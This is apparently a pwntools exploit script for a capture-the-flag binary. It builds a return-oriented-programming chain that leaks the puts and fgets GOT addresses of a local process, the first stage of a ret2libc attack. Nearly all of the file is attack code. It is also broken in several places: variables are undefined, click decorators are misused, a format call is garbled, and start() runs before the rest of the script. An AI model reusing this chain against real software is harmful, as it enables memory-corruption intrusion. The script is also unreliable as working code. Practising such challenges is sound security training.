#!/bin/env python3
from pwn import *
import click 

@click.command()
@click.option('--ip', '-i', help='ip address to exploit')
@click.argument('--exe', '-e', help='name of exe to exploit')
@click.argument('--port', '-p', help='port for the ip address to connect with')
def start(exe, ip, port):#, argv=[], *a, **kw):
    # if args.GDB:
    #     return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    # elif args.REMOTE:
    #     return remote(ip, port, *a, **kw)
    # else:
    return process(exe)


start()

# def start(argv=[],  *a, **kw):
#     if args.GDB:
#         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
#     elif args.REMOTE:
#         return remote(sys.argv[1], sys.argv[2], *a, **kw)
#     else:
#         return process([exe] + argv, *a, **kw)

def find_ip(payload):
    p  = process(exe)
    p.sendlineafter('>', '1')
    p.wait()
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    info('located eip offset at {a}',format(a=ip_offset))
    return ip_offset

gdbscript = '''
init-pwndbg
piebase 
continue
'''.format(**locals())
offset_num = 5
p = process(exe.path)
offset = b'A'* offset_num

rop = ROP([exe])
pop_rdi = rop.find_gadget(['pop_rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
fgets_got = exe.got['fgets']
main_plt = exe.symbols['main']

payload = offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi)
payload += p64(fgets_got)
payload += p64(puts_plt)
payload += p64(main_plt)

p.sendlineafter(b'dah?\n', payload)
puts_got_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
fgets_got_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))

log.info(f'puts_got_leak: {hex(puts_got_leak)}')
log.info(f'fgets_got_leak: {hex(fgets_got_leak)}')

